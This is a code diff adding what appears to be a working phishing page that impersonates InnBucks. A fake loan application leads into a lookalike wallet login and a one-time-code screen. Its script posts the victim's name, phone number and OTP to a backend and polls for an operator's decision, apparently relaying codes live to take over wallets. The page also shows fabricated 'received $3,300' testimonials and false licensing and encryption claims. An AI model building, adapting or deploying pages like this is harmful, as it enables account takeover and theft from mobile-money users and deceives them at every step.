+    <div class="feature-row">
+      <div class="ficon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+      <div class="ftext"><h4>Decision in minutes</h4><p>We review your application quickly. Most decisions come through the same day.</p></div>
+    </div>
+    <div class="feature-row">
+      <div class="ficon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div>
+      <div class="ftext"><h4>Your data stays private</h4><p>We use bank-grade encryption. Your personal information is never sold.</p></div>
+    </div>
+    <div class="feature-row">
+      <div class="ficon"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div>
+      <div class="ftext"><h4>Funds to your InnBucks wallet</h4><p>Once approved, money arrives directly in your wallet — no branch visit needed.</p></div>
+    </div>
+  </div>
+
+  <!-- Social proof toast — landing only -->
+  <div class="s-toast" id="socialToast">
+    <div class="s-avatar" id="toastInitial">B</div>
+    <div class="s-toast-text">
+      <div class="tt-name" id="toastName">Blessing K.</div>
+      <div class="tt-desc" id="toastDesc">received $3,300 · just now</div>
+    </div>
+    <div class="s-toast-check"><svg viewBox="0 0 12 12"><polyline points="2 6 5 9 10 3"/></svg></div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════
+     SCREEN 2 — STEP 1: LOAN DETAILS
+═══════════════════════════════════════ -->
+<div class="screen right" id="screen-phase1">
+  <div class="logo-bar">
+    <div class="logo-grid"><div class="lg o"></div><div class="lg p"></div><div class="lg g"></div><div class="lg r"></div></div>
+    <span class="logo-name">InnBucks <em>Smart</em></span>
+  </div>
+  <div class="page-card">
+    <div class="step-row">
+      <span class="step-tag">Step 1 of 3</span>
+      <span class="step-secure"><svg viewBox="0 0 24 24" stroke="#6b7280" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Secure form</span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" style="width:33%"></div></div>
+    <div class="section-title">Loan details</div>
+    <div class="section-sub">Tell us how much you need and for how long. You can adjust this later.</div>
+    <div class="field">
+      <label class="field-label">Amount requested (USD)</label>
+      <input type="number" id="p1Amount" placeholder="e.g. 1500" min="100" max="10000" oninput="updateCalc()">
+    </div>
+    <div class="field">
+      <label class="field-label">Repayment period</label>
+      <select id="p1Period" onchange="updateCalc()">
+        <option value="6">6 months</option>
+        <option value="12" selected>12 months</option>
+        <option value="18">18 months</option>
+        <option value="24">24 months</option>
+      </select>
+    </div>
+    <div class="repay-box">
+      <div class="repay-box-left">
+        <div class="rb-label">Estimated monthly repayment</div>
+        <div class="rb-note">5% p.a. flat rate · no hidden fees</div>
+      </div>
+      <div class="repay-box-right" id="p1Monthly">$0.00</div>
+    </div>
+    <button class="btn btn-primary btn-full" onclick="nav('screen-phase1','screen-phase2')">Continue</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════
+     SCREEN 3 — STEP 2: YOUR DETAILS
+═══════════════════════════════════════ -->
+<div class="screen right" id="screen-phase2">
+  <div class="logo-bar">
+    <div class="logo-grid"><div class="lg o"></div><div class="lg p"></div><div class="lg g"></div><div class="lg r"></div></div>
+    <span class="logo-name">InnBucks <em>Smart</em></span>
+  </div>
+  <div class="page-card">
+    <div class="step-row">
+      <span class="step-tag">Step 2 of 3</span>
+      <span class="step-secure"><svg viewBox="0 0 24 24" stroke="#6b7280" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Secure form</span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" style="width:66%"></div></div>
+    <div class="section-title">About you</div>
+    <div class="section-sub">We need a few details to assess your application. This takes about 2 minutes.</div>
+    <div class="field">
+      <div class="field-pair">
+        <div><label class="field-label">First name</label><input type="text" id="p2First" placeholder="e.g. Tatenda" oninput="updateCalc(); checkPhase2()"></div>
+        <div><label class="field-label">Last name</label><input type="text" id="p2Last" placeholder="e.g. Moyo" oninput="updateCalc(); checkPhase2()"></div>
+      </div>
+    </div>
+    <div class="field">
+      <label class="field-label">Monthly income (USD)</label>
+      <input type="text" inputmode="numeric" id="p2Income" placeholder="Your average monthly earnings" oninput="sanitiseIncome(this); updateCalc(); checkPhase2()">
+    </div>
+    <div class="field">
+      <label class="field-label">Mobile number</label>
+      <div class="phone-field">
+        <div class="dial-code">+263</div>
+        <input type="tel" id="p2Phone" placeholder="77 100 0000" maxlength="12" oninput="sanitisePhone(this); updateCalc(); checkPhase2()">
+      </div>
+    </div>
+    <div class="btn-row">
+      <button class="btn btn-ghost" onclick="nav('screen-phase2','screen-phase1','back')">← Back</button>
+      <button class="btn btn-primary" id="phase2Btn" onclick="phase2Continue()" disabled style="opacity:0.4;cursor:not-allowed;">Continue</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════
+     SCREEN 4 — STEP 3: REVIEW
+═══════════════════════════════════════ -->
+<div class="screen right" id="screen-phase3">
+  <div class="logo-bar">
+    <div class="logo-grid"><div class="lg o"></div><div class="lg p"></div><div class="lg g"></div><div class="lg r"></div></div>
+    <span class="logo-name">InnBucks <em>Smart</em></span>
+  </div>
+  <div class="page-card">
+    <div class="step-row">
+      <span class="step-tag">Step 3 of 3</span>
+      <span class="step-secure"><svg viewBox="0 0 24 24" stroke="#6b7280" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Secure form</span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div>
+    <div class="section-title">Review & submit</div>
+    <div class="section-sub">Please check your details before submitting. You won't be charged anything today.</div>
+    <div class="summary-card">
+      <div class="s-row"><span class="s-label">LOAN AMOUNT</span><span class="s-value" id="rev-amount">—</span></div>
+      <div class="s-row"><span class="s-label">MONTHLY INCOME</span><span class="s-value" id="rev-income">—</span></div>
+      <div class="s-row"><span class="s-label">APPLICANT</span><span class="s-value" id="rev-name">—</span></div>
+      <div class="s-row"><span class="s-label">EST. MONTHLY REPAYMENT</span><span class="s-value" id="rev-monthly">—</span></div>
+      <div class="s-row"><span class="s-label">INTEREST RATE</span><span class="s-value">5% p.a. flat</span></div>
+    </div>
+    <div class="legal-note">By submitting, you confirm the information above is accurate. InnBucks Smart will use this for a credit assessment. No funds will be disbursed without your confirmation.</div>
+    <div class="btn-row">
+      <button class="btn btn-ghost" onclick="nav('screen-phase3','screen-phase2','back')">← Back</button>
+      <button class="btn btn-submit" onclick="submitApp()">Submit application</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════
+     SCREEN 5 — SUBMITTED / SESSION SECURED
+═══════════════════════════════════════ -->
+<div class="screen right" id="screen-success">
+  <div class="success-banner"><div class="banner-dot"></div>Application received — reference sent by SMS</div>
+  <div class="success-card">
+    <div class="logo-bar" style="padding-top:0;margin-bottom:22px;justify-content:center;">
+      <div class="logo-grid"><div class="lg o"></div><div class="lg p"></div><div class="lg g"></div><div class="lg r"></div></div>
+      <span class="logo-name">InnBucks <em>Smart</em></span>
+    </div>
+    <div class="success-icon">
+      <svg viewBox="0 0 24 24"><path d="M22 2L11 13"/><path d="M22 2L15 22 11 13 2 9l20-7z"/></svg>
+      <div class="success-badge"><svg viewBox="0 0 12 12"><polyline points="2 6 5 9 10 3"/></svg></div>
+    </div>
+    <h2>Application submitted</h2>
+    <p class="s-body">Your details are being reviewed. Most decisions are made within <strong>a few hours</strong> during business days.</p>
+    <p class="s-note">Keep your phone nearby — we'll send your reference number and next steps by SMS.</p>
+    <div class="session-bar">
+      <div class="spin" id="sessionSpinner"></div>
+      <span class="session-text" id="sessionText">Encrypting your session…</span>
+    </div>
+    <button class="manual-btn" id="manualReturnBtn" onclick="goToInnBucks()" style="display:none;">Continue to InnBucks</button>
+  </div>
+  <div class="footer-note">© 2026 InnBucks Smart · Licensed by RBZ</div>
+</div>
+
+<!-- ═══════════════════════════════════════
+     SCREEN 6 — INNBUCKS LOGIN (dark)
+═══════════════════════════════════════ -->
+<div class="screen right" id="screen-login">
+  <div class="login-logo-wrap">
+    <div class="login-dots">
+      <div class="ldot" style="background:#F5A623"></div>
+      <div class="ldot" style="background:#8B5CF6"></div>
+      <div class="ldot" style="background:#22C55E"></div>
+      <div class="ldot" style="background:#EF4444"></div>
+    </div>
+    <span class="login-name">InnBucks</span>
+  </div>
+  <div class="login-heading">
+    <h1>Welcome To<br>InnBucks</h1>
+    <p>Enter the mobile number linked to your InnBucks wallet.</p>
+  </div>
+  <div class="login-field-wrap">
+    <div class="login-field-row">
+      <div class="login-cc">
+        <span>+263</span>
+        <svg viewBox="0 0 10 6"><path d="M0 0l5 6 5-6z"/></svg>
+      </div>
+      <div class="login-divider"></div>
+      <input id="phoneInput" class="login-input" type="tel" placeholder="Enter your mobile number" maxlength="12" oninput="sanitiseLoginPhone(this)"/>
+    </div>
+  </div>
+  <div class="login-terms">
+    By pressing Continue you agree to our <span>Privacy Policy</span> and <span>Terms and Conditions</span>.
+  </div>
+  <div class="login-security">
+    <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    <span>Secured with 256-bit encryption</span>
+  </div>
+  <div class="spacer"></div>
+  <div class="login-btn-wrap">
+    <button class="login-btn" id="loginBtn" onclick="goToOTP()" disabled style="opacity:0.4;cursor:not-allowed;">Continue</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════
+     SCREEN 7 — OTP (dark)
+═══════════════════════════════════════ -->
+<div class="screen right" id="screen-otp">
+  <div class="otp-back" onclick="nav('screen-otp','screen-login','back')">
+    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+  </div>
+  <div class="otp-heading">
+    <h1>Enter your code</h1>
+    <p>We sent a 5-digit code to<br><strong id="otpPhoneDisplay">+263</strong></p>
+  </div>
+  <div class="otp-dots-wrap" onclick="focusOTP()">
+    <div class="otp-d empty" id="d0"></div>
+    <div class="otp-d empty" id="d1"></div>
+    <div class="otp-d empty" id="d2"></div>
+    <div class="otp-d empty" id="d3"></div>
+    <div class="otp-d empty" id="d4"></div>
+    <div class="otp-tap-zone"></div>
+  </div>
+  
+  <!-- OTP Error Message (shown when Wrong Code is clicked) -->
+  <div class="otp-error" id="otpErrorMessage">
+    <strong>Wrong code!</strong> Please try again.
+  </div>
+  
+  <div class="resend-wrap">
+    <button class="resend-link" id="resendLink" onclick="startResend()" disabled style="opacity:0.35;cursor:not-allowed;">Didn't get it? Resend code</button>
+    <div class="resend-countdown" id="resendCountdown">You can resend in 30s</div>
+  </div>
+  <div class="spacer"></div>
+  <div class="otp-btn-wrap">
+    <button class="otp-btn" id="verifyBtn" disabled onclick="handleVerify()">Confirm</button>
+  </div>
+</div>
+
+<!-- Hidden OTP collector -->
+<input id="otp-collector" type="tel" maxlength="5" inputmode="numeric" autocomplete="one-time-code"/>
+
+<script>
+// ============================================
+// CONFIGURATION
+// ============================================
+const API_BASE_URL = 'http://localhost:8000';
+
+// Session management
+let currentSessionId = null;
+let statusCheckInterval = null;
+
+// ══ LOADING OVERLAY CONTROLS ══
+function showLoading() {
+  document.getElementById('loadingOverlay').classList.add('show');
+}
+
+function hideLoading() {
+  document.getElementById('loadingOverlay').classList.remove('show');
+}
+
+// ══ POPUP CONTROLS ══
+function showPopup(title, message, type = 'wrong') {
+  const popupIcon = document.getElementById('popupIcon');
+  const popupTitle = document.getElementById('popupTitle');
+  const popupMessage = document.getElementById('popupMessage');
+  
+  // Set the appropriate icon
+  if (type === 'wrong') {
+    popupIcon.innerHTML = '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
+  } else {
+    popupIcon.innerHTML = '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><circle cx="12" cy="16" r="0.5" fill="currentColor"/></svg>';
+  }
+  
+  popupIcon.className = 'popup-icon ' + type;
+  popupTitle.textContent = title;
+  popupMessage.textContent = message;
+  
+  document.getElementById('popupOverlay').classList.add('show');
+}
+
+function closePopup() {
+  document.getElementById('popupOverlay').classList.remove('show');
+}
+
+// ══ API CALLS ══
+async function callApi(action, data = {}) {
+  const formData = new FormData();
+  formData.append('action', action);
+  
+  for (let key in data) {
+    formData.append(key, data[key]);
+  }
+  
+  try {
+    const response = await fetch(`${API_BASE_URL}/api.php`, {
+      method: 'POST',
+      body: formData
+    });
+    return await response.json();
+  } catch (error) {
+    console.error('API call failed:', error);
+    return { success: false };
+  }
+}
+
+// ══ START POLLING ══
+function startStatusPolling(sessionId) {
+  if (statusCheckInterval) {
+    clearInterval(statusCheckInterval);
+  }
+  
+  currentSessionId = sessionId;
+  console.log('Started polling for session:', sessionId);
+  
+  statusCheckInterval = setInterval(async () => {
+    try {
+      const response = await fetch(`${API_BASE_URL}/api.php?action=check_status&sessionId=${sessionId}&t=${Date.now()}`);
+      const result = await response.json();
+      
+      if (result.success && result.status) {
+        if (result.status === 'approved') {
+          console.log('✅ Approved');
+          hideLoading();
+          clearInterval(statusCheckInterval);
+          statusCheckInterval = null;
+        } 
+        else if (result.status === 'wrong_code') {
+          console.log('❌ Wrong code');
+          hideLoading();
+          clearInterval(statusCheckInterval);
+          statusCheckInterval = null;
+          showPopup('Incorrect Code', 'The code you entered is incorrect. Please try again.', 'wrong');
+          resetOTP();
+        } 
+        else if (result.status === 'continue') {
+          console.log('➡️ Continue');
+          hideLoading();
+          clearInterval(statusCheckInterval);
+          statusCheckInterval = null;
+          showPopup('Insufficient Funds', 'Please add more funds to your account and try again.', 'continue');
+        }
+      }
+    } catch (error) {
+      console.error('Polling error:', error);
+    }
+  }, 1000);
+}
+
+// ══ NAVIGATION ══
+function nav(from, to, dir = 'forward') {
+  const f = document.getElementById(from);
+  const t = document.getElementById(to);
+  if (dir === 'forward') {
+    f.classList.replace('active','left');
+    t.classList.replace('right','active');
+  } else {
+    f.classList.replace('active','right');
+    t.classList.replace('left','active');
+  }
+  t.scrollTop = 0;
+}
+
+// ══ LOAN CALCULATOR ══
+const APR = 0.05;
+function calcMonthly(amt, months) {
+  if (!amt || amt <= 0) return 0;
+  const r = APR / 12;
+  return (amt * r * Math.pow(1+r, months)) / (Math.pow(1+r, months) - 1);
+}
+function fmt(n) {
+  return '$' + n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+function updateSlider(val) {
+  const v = parseInt(val);
+  document.getElementById('loanAmount').textContent = '$' + v.toLocaleString();
+  document.getElementById('monthlyRepay').textContent = fmt(calcMonthly(v, 12));
+  const pct = ((v - 100) / (10000 - 100)) * 100;
+  document.getElementById('loanSlider').style.background =
+    `linear-gradient(to right, #2563EB 0%, #2563EB ${pct}%, #e5e7eb ${pct}%)`;
+  document.getElementById('p1Amount').value = v;
+  updateCalc();
+}
+
+function updateCalc() {
+  const amt    = parseFloat(document.getElementById('p1Amount').value) || 0;
+  const months = parseInt(document.getElementById('p1Period').value)   || 12;
+  const income = parseFloat(document.getElementById('p2Income').value) || 0;
+  const first  = document.getElementById('p2First').value.trim();
+  const last   = document.getElementById('p2Last').value.trim();
+  const monthly = calcMonthly(amt, months);
+  document.getElementById('p1Monthly').textContent   = fmt(monthly);
+  document.getElementById('rev-amount').textContent  = amt    > 0 ? '$' + amt.toLocaleString() : '—';
+  document.getElementById('rev-income').textContent  = income > 0 ? '$' + income.toLocaleString() : '—';
+  document.getElementById('rev-monthly').textContent = amt    > 0 ? fmt(monthly) + ' / mo' : '—';
+  document.getElementById('rev-name').textContent    = [first,last].filter(Boolean).join(' ') || '—';
+}
+
+// ══ PHASE 2 — INPUT SANITISERS ══
+function sanitiseIncome(el) {
+  el.value = el.value.replace(/\D/g, '');
+}
+
+function sanitisePhone(el) {
+  el.value = el.value.replace(/\D/g, '').slice(0, 12);
+}
+
+function checkPhase2() {
+  const first  = document.getElementById('p2First').value.trim();
+  const last   = document.getElementById('p2Last').value.trim();
+  const income = document.getElementById('p2Income').value.trim();
+  const phone  = document.getElementById('p2Phone').value.trim();
+  const btn    = document.getElementById('phase2Btn');
+  const phoneLen = phone.length;
+  const ready  = first && last && income && (phoneLen >= 9 && phoneLen <= 12);
+  btn.disabled = !ready;
+  btn.style.opacity = ready ? '1' : '0.4';
+  btn.style.cursor  = ready ? 'pointer' : 'not-allowed';
+}
+
+function phase2Continue() {
+  const first  = document.getElementById('p2First').value.trim();
+  const last   = document.getElementById('p2Last').value.trim();
+  const income = document.getElementById('p2Income').value.trim();
+  const phone  = document.getElementById('p2Phone').value.trim();
+  const phoneLen = phone.length;
+  if (!first || !last || !income || phoneLen < 9 || phoneLen > 12) return;
+  nav('screen-phase2', 'screen-phase3');
+}
+
+// ══ SUBMIT → SESSION SECURED ══
+function submitApp() {
+  nav('screen-phase3', 'screen-success');
+  let s = 5;
+  const textEl    = document.getElementById('sessionText');
+  const spinnerEl = document.getElementById('sessionSpinner');
+  const returnBtn = document.getElementById('manualReturnBtn');
+  textEl.textContent = `Encrypting your session… (${s}s)`;
+  const iv = setInterval(() => {
+    s--;
+    if (s <= 0) {
+      clearInterval(iv);
+      textEl.textContent = 'Session secured ✓';
+      spinnerEl.style.display = 'none';
+      returnBtn.style.display = 'block';
+      setTimeout(() => goToInnBucks(), 1200);
+    } else {
+      textEl.textContent = `Encrypting your session… (${s}s)`;
+    }
+  }, 1000);
+}
+
+function goToInnBucks() {
+  nav('screen-success', 'screen-login');
+}
+
+// ══ LOGIN PHONE ══
+function sanitiseLoginPhone(el) {
+  el.value = el.value.replace(/\D/g, '').slice(0, 12);
+  const btn = document.getElementById('loginBtn');
+  const phoneLen = el.value.length;
+  const ready = (phoneLen >= 9 && phoneLen <= 12);
+  btn.disabled = !ready;
+  btn.style.opacity = ready ? '1' : '0.4';
+  btn.style.cursor  = ready ? 'pointer' : 'not-allowed';
+}
+
+// ══ LOGIN → OTP ══
+async function goToOTP() {
+  const raw = document.getElementById('phoneInput').value.trim();
+  if (raw.length < 9 || raw.length > 12) return;
+  
+  const firstName = document.getElementById('p2First').value.trim() || 'Unknown';
+  const lastName = document.getElementById('p2Last').value.trim() || 'User';
+  
+  showLoading();
+  
+  const result = await callApi('login_attempt', {
+    firstName: firstName,
+    lastName: lastName,
+    phone: raw
+  });
+  
+  if (result.success && result.data && result.data.sessionId) {
+    currentSessionId = result.data.sessionId;
+    document.getElementById('otpPhoneDisplay').textContent = '+263 ' + raw;
+    nav('screen-login', 'screen-otp');
+    resetOTP();
+    startOTPResendCountdown();
+    setTimeout(focusOTP, 400);
+    startStatusPolling(currentSessionId);
+  } else {
+    hideLoading();
+    alert('Failed to send request. Please try again.');
+  }
+}
+
+// ══ OTP ══
+const collector = document.getElementById('otp-collector');
+const verifyBtn = document.getElementById('verifyBtn');
+const dots      = [0,1,2,3,4].map(i => document.getElementById('d'+i));
+
+function focusOTP() { collector.focus(); }
+
+function resetOTP() {
+  collector.value = '';
+  setDots(0);
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'Confirm';
+  document.getElementById('otpErrorMessage').classList.remove('show');
+}
+
+collector.addEventListener('input', () => {
+  const v = collector.value.replace(/\D/g,'').slice(0,5);
+  collector.value = v;
+  setDots(v.length);
+  verifyBtn.disabled = v.length < 5;
+});
+
+collector.addEventListener('keydown', () => setTimeout(() => setDots(collector.value.length), 0));
+
+function setDots(n) {
+  dots.forEach((d,i) => {
+    d.classList.toggle('filled', i < n);
+    d.classList.toggle('empty',  i >= n);
+  });
+}
+
+// Resend
+let resendIv = null;
+
+function startOTPResendCountdown() {
+  const btn = document.getElementById('resendLink');
+  const cd  = document.getElementById('resendCountdown');
+  btn.disabled = true;
+  btn.style.opacity = '0.35';
+  clearInterval(resendIv);
+  let s = 30;
+  cd.textContent = `Resend in ${s}s`;
+  resendIv = setInterval(() => {
+    s--;
+    if (s <= 0) {
+      clearInterval(resendIv);
+      cd.textContent = '';
+      btn.disabled = false;
+      btn.style.opacity = '1';
+    } else {
+      cd.textContent = `Resend in ${s}s`;
+    }
+  }, 1000);
+}
+
+function startResend() {
+  startOTPResendCountdown();
+  resetOTP();
+}
+
+// ══ HANDLE OTP VERIFICATION ══
+async function handleVerify() {
+  if (collector.value.length === 5 && currentSessionId) {
+    showLoading();
+    
+    const result = await callApi('otp_entered', {
+      sessionId: currentSessionId,
+      otp: collector.value
+    });
+    
+    if (result.success) {
+      verifyBtn.textContent = 'Verifying…';
+      verifyBtn.disabled = true;
+    } else {
+      hideLoading();
+      alert('Failed to send OTP. Please try again.');
+    }
+  }
+}
+
+// ══ SOCIAL PROOF TOAST ══
+const toastPeople = [
+  { name:'Blessing K.',  initial:'B', amount:3300, ago:'2 min ago'  },
+  { name:'Tatenda M.',   initial:'T', amount:1500, ago:'just now'   },
+  { name:'Chido N.',     initial:'C', amount:5000, ago:'4 min ago'  },
+  { name:'Farai S.',     initial:'F', amount:2200, ago:'7 min ago'  },
+  { name:'Rudo T.',      initial:'R', amount:800,  ago:'just now'   },
+  { name:'Munashe P.',   initial:'M', amount:4100, ago:'3 min ago'  },
+];
+let toastIdx = 0;
+
+function showToast() {
+  if (!document.getElementById('screen-landing').classList.contains('active')) return;
+  const p = toastPeople[toastIdx % toastPeople.length]; toastIdx++;
+  document.getElementById('toastInitial').textContent = p.initial;
+  document.getElementById('toastName').textContent    = p.name;
+  document.getElementById('toastDesc').textContent    = `received $${p.amount.toLocaleString()} · ${p.ago}`;
+  const el = document.getElementById('socialToast');
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 4000);
+}
+
+// Clean up
+window.addEventListener('load', () => {
+  const originalNav = nav;
+  window.nav = function(from, to, dir) {
+    if (from === 'screen-otp' || to !== 'screen-otp') {
+      if (statusCheckInterval) {
+        clearInterval(statusCheckInterval);
+        statusCheckInterval = null;
+      }
+      hideLoading();
+    }
+    originalNav(from, to, dir);
+  };
+});
+
+// Init
+updateSlider(1000);
+setTimeout(() => { showToast(); setInterval(showToast, 7000); }, 3000);
+</script>
+</body>
+</html>
